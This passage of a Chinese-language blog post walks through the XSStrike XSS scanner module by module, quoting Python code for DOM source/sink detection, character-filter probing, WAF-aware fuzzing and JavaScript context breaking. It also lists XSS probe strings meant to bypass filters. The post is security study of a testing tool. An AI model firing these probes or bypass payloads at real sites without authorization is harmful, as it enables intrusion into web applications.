class="line">    <span class="string">&#x27;&lt;test sRc=xxx&#x27;</span>, <span class="string">&#x27;&lt;test data=asa&#x27;</span>, <span class="string">&#x27;&lt;test data=javascript:asa&#x27;</span>, <span class="string">&#x27;&lt;svg x=y&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;details x=y//&#x27;</span>, <span class="string">&#x27;&lt;a href=x//&#x27;</span>, <span class="string">&#x27;&lt;emBed x=y&gt;&#x27;</span>, <span class="string">&#x27;&lt;object x=y//&#x27;</span>, <span class="string">&#x27;&lt;bGsOund sRc=x&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;iSinDEx x=y//&#x27;</span>, <span class="string">&#x27;&lt;aUdio x=y&gt;&#x27;</span>, <span class="string">&#x27;&lt;script x=y&gt;&#x27;</span>, <span class="string">&#x27;&lt;script//src=//&#x27;</span>, <span class="string">&#x27;&quot;&gt;payload&lt;br/attr=&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;-confirm``-&quot;&#x27;</span>, <span class="string">&#x27;&lt;test ONdBlcLicK=x&gt;&#x27;</span>, <span class="string">&#x27;&lt;test/oNcoNTeXtMenU=x&gt;&#x27;</span>, <span class="string">&#x27;&lt;test OndRAgOvEr=x&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>定义了全局变量和常量，如XSS检查字符串(xsschecker)、线程数、超时时间、代理设置等</li>
+<li>定义了常见的参数名列表，用于参数发现和测试</li>
+<li>定义了常见的事件处理函数以及它们的标签，以及用于触发弹窗的js代码</li>
+<li>定义了常见的用于绕过过滤和waf的payload集合</li>
+<li>定义了特别容易受到盲XSS攻击的参数列表</li>
+<li>设置了默认的HTTP请求头，模拟正常浏览器行为</li>
+<li>提供了生成随机字符串的函数，用于创建唯一标识符</li>
+<li>这些配置为整个工具提供了基础设置和常量值</li>
+</ul>
+<h2 id="dom-xss扫描模块-coredompy"><a class="markdownIt-Anchor" href="#dom-xss扫描模块-coredompy"></a> DOM XSS扫描模块 (core/dom.py)</h2>
+<p>该模块专门用于检测DOM XSS漏洞，通过分析JavaScript代码中的危险源和接收器。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dom</span>(<span class="params">response</span>):</span><br><span class="line">    highlighted = []</span><br><span class="line">    sources = <span class="string">r&#x27;&#x27;&#x27;\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname)|window\.name|history\.(pushState|replaceState)(local|session)Storage)\b&#x27;&#x27;&#x27;</span></span><br><span class="line">    sinks = <span class="string">r&#x27;&#x27;&#x27;\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)\b&#x27;&#x27;&#x27;</span></span><br><span class="line">    scripts = re.findall(<span class="string">r&#x27;(?i)(?s)&lt;script[^&gt;]*&gt;(.*?)&lt;/script&gt;&#x27;</span>, response)</span><br><span class="line">    sinkFound, sourceFound = <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> script <span class="keyword">in</span> scripts:</span><br><span class="line">        script = script.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        allControlledVariables = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> newLine <span class="keyword">in</span> script:</span><br><span class="line">                line = newLine</span><br><span class="line">                parts = line.split(<span class="string">&#x27;var &#x27;</span>)</span><br><span class="line">                controlledVariables = <span class="built_in">set</span>()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt; <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">                        <span class="keyword">for</span> controlledVariable <span class="keyword">in</span> allControlledVariables:</span><br><span class="line">                            <span class="keyword">if</span> controlledVariable <span class="keyword">in</span> part:</span><br><span class="line">                                controlledVariables.add(re.search(<span class="string">r&#x27;[a-zA-Z$_][a-zA-Z0-9$_]+&#x27;</span>, part).group().replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\$&#x27;</span>))</span><br><span class="line">                pattern = re.finditer(sources, newLine)</span><br><span class="line">                <span class="keyword">for</span> grp <span class="keyword">in</span> pattern:</span><br><span class="line">                    <span class="keyword">if</span> grp:</span><br><span class="line">                        source = newLine[grp.start():grp.end()].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">if</span> source:</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt; <span class="number">1</span>:</span><br><span class="line">                               <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">                                    <span class="keyword">if</span> source <span class="keyword">in</span> part:</span><br><span class="line">                                        controlledVariables.add(re.search(<span class="string">r&#x27;[a-zA-Z$_][a-zA-Z0-9$_]+&#x27;</span>, part).group().replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\$&#x27;</span>))</span><br><span class="line">                            line = line.replace(source, yellow + source + end)</span><br><span class="line">                <span class="keyword">for</span> controlledVariable <span class="keyword">in</span> controlledVariables:</span><br><span class="line">                    allControlledVariables.add(controlledVariable)</span><br><span class="line">                <span class="keyword">for</span> controlledVariable <span class="keyword">in</span> allControlledVariables:</span><br><span class="line">                    matches = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, re.findall(<span class="string">r&#x27;\b%s\b&#x27;</span> % controlledVariable, line)))</span><br><span class="line">                    <span class="keyword">if</span> matches:</span><br><span class="line">                        sourceFound = <span class="literal">True</span></span><br><span class="line">                        line = re.sub(<span class="string">r&#x27;\b%s\b&#x27;</span> % controlledVariable, yellow + controlledVariable + end, line)</span><br><span class="line">                pattern = re.finditer(sinks, newLine)</span><br><span class="line">                <span class="keyword">for</span> grp <span class="keyword">in</span> pattern:</span><br><span class="line">                    <span class="keyword">if</span> grp:</span><br><span class="line">                        sink = newLine[grp.start():grp.end()].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">if</span> sink:</span><br><span class="line">                            line = line.replace(sink, red + sink + end)</span><br><span class="line">                            sinkFound = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> line != newLine:</span><br><span class="line">                    highlighted.append(<span class="string">&#x27;%-3s %s&#x27;</span> % (<span class="built_in">str</span>(num), line.lstrip(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> MemoryError:</span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>分析HTTP响应中的JavaScript代码，寻找DOM XSS漏洞</li>
+<li>定义了两个正则表达式：</li>
+<li>sources: 匹配可能的XSS源，如document.URL、location.href等</li>
+<li>sinks: 匹配可能的XSS接收器，如eval、innerHTML等</li>
+<li>从响应中提取所有<script>标签内的JavaScript代码</li>
+<li>分析每个脚本，寻找潜在的源和接收器</li>
+<li>特别关注document.write方法，这是一个常见的DOM XSS漏洞点</li>
+<li>如果同时发现源和接收器，则认为存在DOM XSS漏洞</li>
+<li>记录所有发现的潜在漏洞点</li>
+</ul>
+<h2 id="编码模块-coreencoderspy"><a class="markdownIt-Anchor" href="#编码模块-coreencoderspy"></a> 编码模块 (core/encoders.py)</h2>
+<p>该模块提供各种编码函数，用于对XSS有效载荷进行编码，以绕过过滤和WAF。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base64</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+\/=]+$&#x27;</span>, string) <span class="keyword">and</span> (<span class="built_in">len</span>(string) % <span class="number">4</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b64.b64decode(string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> b64.b64encode(string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>仅提供了base64的编码绕过</p>
+<h2 id="过滤器检测模块-corefiltercheckerpy"><a class="markdownIt-Anchor" href="#过滤器检测模块-corefiltercheckerpy"></a> 过滤器检测模块 (core/filterChecker.py)</h2>
+<p>该模块用于检测目标网站对特定字符的过滤情况。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filterChecker</span>(<span class="params">url, params, headers, GET, delay, occurences, timeout, encoding</span>):</span><br><span class="line">    positions = occurences.keys()</span><br><span class="line">    sortedEfficiencies = &#123;&#125;</span><br><span class="line">    <span class="comment"># adding &lt; &gt; to environments anyway because they can be used in all contexts</span></span><br><span class="line">    environments = <span class="built_in">set</span>([<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(positions)):</span><br><span class="line">        sortedEfficiencies[i] = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> occurences:</span><br><span class="line">        occurences[i][<span class="string">&#x27;score&#x27;</span>] = &#123;&#125;</span><br><span class="line">        context = occurences[i][<span class="string">&#x27;context&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context == <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">            environments.add(<span class="string">&#x27;--&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> context == <span class="string">&#x27;script&#x27;</span>:</span><br><span class="line">            environments.add(occurences[i][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;quote&#x27;</span>])</span><br><span class="line">            environments.add(<span class="string">&#x27;&lt;/scRipT/&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> context == <span class="string">&#x27;attribute&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> occurences[i][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;value&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> occurences[i][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;srcdoc&#x27;</span>:  <span class="comment"># srcdoc attribute accepts html data with html entity encoding</span></span><br><span class="line">                    environments.add(<span class="string">&#x27;&amp;lt;&#x27;</span>)  <span class="comment"># so let&#x27;s add the html entity</span></span><br><span class="line">                    environments.add(<span class="string">&#x27;&amp;gt;&#x27;</span>)  <span class="comment"># encoded versions of &lt; and &gt;</span></span><br><span class="line">            <span class="keyword">if</span> occurences[i][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;quote&#x27;</span>]:</span><br><span class="line">                environments.add(occurences[i][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;quote&#x27;</span>])</span><br><span class="line">    <span class="keyword">for</span> environment <span class="keyword">in</span> environments:</span><br><span class="line">        <span class="keyword">if</span> environment:</span><br><span class="line">            efficiencies = checker(</span><br><span class="line">                url, params, headers, GET, delay, environment, positions, timeout, encoding)</span><br><span class="line">            efficiencies.extend([<span class="number">0</span>] * (<span class="built_in">len</span>(occurences) - <span class="built_in">len</span>(efficiencies)))</span><br><span class="line">            <span class="keyword">for</span> occurence, efficiency <span class="keyword">in</span> <span class="built_in">zip</span>(occurences, efficiencies):</span><br><span class="line">                occurences[occurence][<span class="string">&#x27;score&#x27;</span>][environment] = efficiency</span><br><span class="line">    <span class="keyword">return</span> occurences</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p><strong>默认加入</strong>  <strong>​<code>&amp;lt;</code>​</strong> ​ <strong>和</strong>  <strong>​<code>&amp;gt;</code>​</strong> ​，因为这些符号在 HTML 注释、标签、属性等上下文中都很关键。</p>
+</li>
+<li>
+<p>计算每个注入点中特定字符的出现效率</p>
+</li>
+<li>
+<p>根据字符出现情况判断注入点的环境类型：</p>
+</li>
+<li>
+<p>如果&lt;和&gt;都存在，检查是否在HTML标签内</p>
+</li>
+<li>
+<p>如果在标签内，进一步判断是在普通HTML环境还是在script标签内：<strong>如果漏洞出现在 HTML 注释中</strong>（<code>&lt;!-- 注释 --&gt;</code>​），那么 <code>--&gt;</code>​ 可能是关键字符，因为可以用来<strong>终止注释</strong>。</p>
+<p><strong>如果漏洞出现在&lt;script&gt;内部</strong>：</p>
+<ul>
+<li>添加可能影响解析的<strong>引号</strong>（<code>&quot;</code>​ 或 <code>'</code>​）。</li>
+<li>添加 <code>&lt;/scRipT/&gt;</code>​，可能用于** 闭合 `` 标签&lt;/strong&gt; ** ，使后续代码变成 HTML。</li>
+</ul>
+</li>
+<li>
+<p>如果没有特殊字符，则认为是在JavaScript环境中</p>
+</li>
+<li>
+<p>返回每个注入点的环境类型，用于后续生成适合的XSS有效载荷</p>
+</li>
+<li>
+<p>这种分析有助于确定最有效的XSS攻击向量</p>
+</li>
+</ul>
+<h2 id="模糊测试模块-corefuzzerpy"><a class="markdownIt-Anchor" href="#模糊测试模块-corefuzzerpy"></a> 模糊测试模块 (core/fuzzer.py)</h2>
+<p>该模块通过发送各种字符和模式来测试目标网站的过滤和响应情况。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fuzzer</span>(<span class="params">url, params, headers, GET, delay, timeout, WAF, encoding</span>):</span><br><span class="line">    <span class="keyword">for</span> fuzz <span class="keyword">in</span> fuzzes:</span><br><span class="line">        <span class="keyword">if</span> delay == <span class="number">0</span>:</span><br><span class="line">            delay = <span class="number">0</span></span><br><span class="line">        t = delay + randint(delay, delay * <span class="number">2</span>) + counter(fuzz)</span><br><span class="line">        sleep(t)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> encoding:</span><br><span class="line">                fuzz = encoding(unquote(fuzz))</span><br><span class="line">            data = replaceValue(params, xsschecker, fuzz, copy.deepcopy)</span><br><span class="line">            response = requester(url, data, headers, GET, delay/<span class="number">2</span>, timeout)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logger.error(<span class="string">&#x27;WAF is dropping suspicious requests.&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> delay == <span class="number">0</span>:</span><br><span class="line">                logger.info(<span class="string">&#x27;Delay has been increased to %s6%s seconds.&#x27;</span> % (green, end))</span><br><span class="line">                delay += <span class="number">6</span></span><br><span class="line">            limit = (delay + <span class="number">1</span>) * <span class="number">50</span></span><br><span class="line">            timer = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> timer &lt; limit:</span><br><span class="line">                logger.info(<span class="string">&#x27;\rFuzzing will continue after %s%i%s seconds.\t\t\r&#x27;</span> % (green, limit, end))</span><br><span class="line">                limit -= <span class="number">1</span></span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requester(url, params, headers, GET, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">                logger.good(<span class="string">&#x27;Pheww! Looks like sleeping for %s%i%s seconds worked!&#x27;</span> % (</span><br><span class="line">                    green, ((delay + <span class="number">1</span>) * <span class="number">2</span>), end))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                logger.error(<span class="string">&#x27;\nLooks like WAF has blocked our IP Address. Sorry!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> encoding:</span><br><span class="line">            fuzz = encoding(fuzz)</span><br><span class="line">        <span class="keyword">if</span> fuzz.lower() <span class="keyword">in</span> response.text.lower():  <span class="comment"># if fuzz string is reflected in the response</span></span><br><span class="line">            result = (<span class="string">&#x27;%s[passed]  %s&#x27;</span> % (green, end))</span><br><span class="line">        <span class="comment"># if the server returned an error (Maybe WAF blocked it)</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">str</span>(response.status_code)[:<span class="number">1</span>] != <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            result = (<span class="string">&#x27;%s[blocked] %s&#x27;</span> % (red, end))</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># if the fuzz string was not reflected in the response completely</span></span><br><span class="line">            result = (<span class="string">&#x27;%s[filtered]%s&#x27;</span> % (yellow, end))</span><br><span class="line">        logger.info(<span class="string">&#x27;%s %s&#x27;</span> % (result, fuzz))</span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>使用一系列预定义的XSS向量测试目标网站</li>
+<li>每个向量都有不同的复杂度和绕过技术</li>
+<li>支持base64编码方式</li>
+<li>发送每个向量并分析响应，检查向量是否被过滤或修改</li>
+<li>计算每个向量的效率，即成功率</li>
+<li>如果向量成功，还会测试向量中的单个字符，以确定哪些字符被允许</li>
+<li>返回成功的向量和每个位置的总体效率</li>
+<li>这些信息用于后续生成更有效的XSS有效载荷</li>
+</ul>
+<h2 id="有效载荷生成器-coregeneratorpy"><a class="markdownIt-Anchor" href="#有效载荷生成器-coregeneratorpy"></a> 有效载荷生成器 (core/generator.py)</h2>
+<p>该模块根据之前的测试结果生成定制的XSS有效载荷。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302135933-f0l6sf7.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>根据之前的测试结果生成定制的XSS有效载荷</li>
+<li>根据不同的上下文(HTML、属性、注释、脚本、样式)生成不同的有效载荷</li>
+<li>使用不同的标签、事件处理器和填充字符创建多样化的有效载荷</li>
+<li>对每个有效载荷分配优先级(1-11)，优先级越高，成功率越高</li>
+<li>支持多种格式的有效载荷，如img、svg、script等</li>
+<li>对于JavaScript上下文，使用jsContexter分析脚本并生成适当的闭合字符串</li>
+<li>对于属性上下文，根据属性名和引号类型生成不同的有效载荷</li>
+<li>返回按优先级分组的有效载荷集合</li>
+</ul>
+<h2 id="html解析模块-corehtmlparserpy"><a class="markdownIt-Anchor" href="#html解析模块-corehtmlparserpy"></a> HTML解析模块 (core/htmlParser.py)</h2>
+<p>该模块解析HTML响应，确定XSS检查点的上下文。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302140426-wwwfi9p.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>分析HTTP响应中XSS检查点的上下文环境</p>
+</li>
+<li>
+<p>使用正则表达式识别不同的上下文:</p>
+<ul>
+<li>脚本上下文: 检查点在<script>标签内</li>
+<li>属性上下文: 检查点在HTML标签的属性中</li>
+<li>HTML上下文: 检查点在HTML标签之间的文本中</li>
+<li>注释上下文: 检查点在HTML注释中</li>
+<li>样式上下文: 检查点在<style>标签内</li>
+</ul>
+</li>
+<li>
+<p>对于每个上下文，提取详细信息:</p>
+<ul>
+<li>标签名称</li>
+<li>属性名称(如果在属性中)</li>
+<li>引号类型(单引号、双引号或无引号)</li>
+</ul>
+</li>
+<li>
+<p>返回包含所有检查点上下文信息的字典</p>
+</li>
+<li>
+<p>这些信息对于生成有效的XSS有效载荷至关重要，因为不同上下文需要不同的有效载荷格式</p>
+</li>
+</ul>
+<h2 id="javascript上下文分析模块-corejscontexterpy"><a class="markdownIt-Anchor" href="#javascript上下文分析模块-corejscontexterpy"></a> JavaScript上下文分析模块 (core/jsContexter.py)</h2>
+<p>该模块分析JavaScript代码，确定如何闭合JavaScript上下文以注入XSS有效载荷。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">jsContexter</span>(<span class="params">script</span>):</span><br><span class="line">    broken = script.split(xsschecker)</span><br><span class="line">    pre = broken[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#  remove everything that is between &#123;..&#125;, &quot;...&quot; or &#x27;...&#x27;</span></span><br><span class="line">    pre = re.sub(<span class="string">r&#x27;(?s)\&#123;.*?\&#125;|\(.*?\)|&quot;.*?&quot;|\&#x27;.*?\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, pre)</span><br><span class="line">    breaker = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> pre:  <span class="comment"># iterate over the remaining characters</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">            breaker += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            breaker += <span class="string">&#x27;;)&#x27;</span>  <span class="comment"># yes, it should be ); but we will invert the whole thing later</span></span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            breaker += <span class="string">&#x27;]&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> pre[num + <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    breaker += <span class="string">&#x27;/*&#x27;</span></span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27;&#125;&#x27;</span>:  <span class="comment"># we encountered a &#125; so we will strip off &quot;our &#125;&quot; because this one does the job</span></span><br><span class="line">            breaker = stripper(breaker, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27;)&#x27;</span>:  <span class="comment"># we encountered a ) so we will strip off &quot;our &#125;&quot; because this one does the job</span></span><br><span class="line">            breaker = stripper(breaker, <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> breaker == <span class="string">&#x27;]&#x27;</span>:  <span class="comment"># we encountered a ] so we will strip off &quot;our &#125;&quot; because this one does the job</span></span><br><span class="line">            breaker = stripper(breaker, <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> breaker[::-<span class="number">1</span>]  <span class="comment"># invert the breaker string</span></span><br></pre></td></tr></table></figure>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>分析JavaScript代码中XSS检查点的上下文</p>
+</li>
+<li>
+<p>将代码分割为检查点前后的部分</p>
+</li>
+<li>
+<p>根据检查点前后的字符确定适当的闭合字符串:</p>
+<ul>
+<li>如果前面是=或/*，使用&quot;&quot;+闭合</li>
+<li>如果前面是+，使用&quot;&quot;闭合</li>
+<li>如果前面是&lt;或后面是&lt;，使用//闭合(注释)</li>
+<li>如果前面是-或–或后面是-，使用//闭合</li>
+</ul>
+</li>
+<li>
+<p>返回适当的闭合字符串，用于构建有效的JavaScript XSS有效载荷</p>
+</li>
+<li>
+<p>这种分析确保生成的有效载荷能够正确闭合JavaScript上下文并执行</p>
+</li>
+</ul>
+<h2 id="日志记录模块-corelogpy"><a class="markdownIt-Anchor" href="#日志记录模块-corelogpy"></a> 日志记录模块 (core/log.py)</h2>
+<p>该模块提供日志记录功能，用于记录扫描过程中的信息、警告和错误。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302140837-ug9xo6v.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>设置基本的日志配置，将日志写入xsstrike.log文件</p>
+</li>
+<li>
+<p>创建自定义格式化器，为不同级别的日志添加颜色和前缀</p>
+</li>
+<li>
+<p>定义日志级别:</p>
+<ul>
+<li>info: 一般信息，使用黄色[!]前缀</li>
+<li>warning: 警告信息，使用蓝色[?]前缀</li>
+<li>error: 错误信息，使用红色[-]前缀</li>
+<li>debug: 调试信息，使用白色[~]前缀</li>
+<li>critical: 严重错误，使用红色[-]前缀</li>
+<li>good: 成功信息，使用绿色[+]前缀</li>
+<li>run: 运行信息，使用白色[~]前缀</li>
+</ul>
+</li>
+<li>
+<p>提供setup_logger函数，为每个模块创建自定义日志记录器</p>
+</li>
+<li>
+<p>同时将日志输出到控制台和日志文件</p>
+</li>
+<li>
+<p>这种日志系统使得扫描过程更加透明，便于调试和问题排查</p>
+</li>
+</ul>
+<h2 id="网站爬虫模块-corephotonpy"><a class="markdownIt-Anchor" href="#网站爬虫模块-corephotonpy"></a> 网站爬虫模块 (core/photon.py)</h2>
+<p>该模块实现了一个简单的网站爬虫，用于发现潜在的XSS注入点。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="image-20250302140945-lwm31fb.png"
+                        alt="image" 
+                 >​</p>
+<p>详细功能说明:</p>
+<ul>
+<li>
+<p>实现网站爬虫功能，从种子URL开始爬取网站</p>
+</li>
+<li>
+<p>支持多级爬取，通过level参数控制爬取深度</p>
+</li>
+<li>
+<p>使用多线程并行爬取，提高效率</p>
+</li>
+<li>
+<p>提取网页中的所有表单:</p>
+<ul>
+<li>表单的action属性</li>
+<li>表单的method属性(GET或POST)</li>
+<li>表单中的所有input字段</li>
+</ul>
+</li>
+<li>
+<p>提取网页中的所有链接，并过滤掉JavaScript链接和锚点链接</p>
+</li>
+<li>
+<p>处理相对路径，将其转换为绝对路径</p>
+</li>
+<li>
+<p>只爬取同一主机名下的URL，避免爬取外部网站</p>
+</li>
+<li>
+<p>返回发现的所有表单和URL</p>
+</li>
+<li>
+<p>这些信息用于后续的XSS扫描，提供潜在的注入点</p>
+</li>
+</ul>
